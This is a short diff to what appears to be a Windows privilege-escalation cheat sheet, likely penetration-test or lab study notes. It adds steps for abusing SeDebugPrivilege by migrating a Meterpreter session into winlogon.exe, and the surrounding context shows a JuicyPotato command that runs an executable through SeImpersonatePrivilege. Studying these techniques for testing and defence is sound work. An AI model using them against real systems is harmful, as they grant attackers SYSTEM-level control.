@@ -390,6 +390,10 @@ Check if SeImpersonatePrivilege authentication is enabled with ``whoami /priv``
 C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\exe.exe -l 5837
 ```
 
+## SeDebugPrivilege Privesc
+* get meterpreter session and show processes with ``ps``
+* look for winlogon.exe and ``migrate <PID>`` 
+
 ## Active Directory Certificate Service
 Active Directory Certificate Services (AD CS) is a Windows Server role for issuing and managing public key infrastructure (PKI) certificates used in secure communication and authentication protocols
 
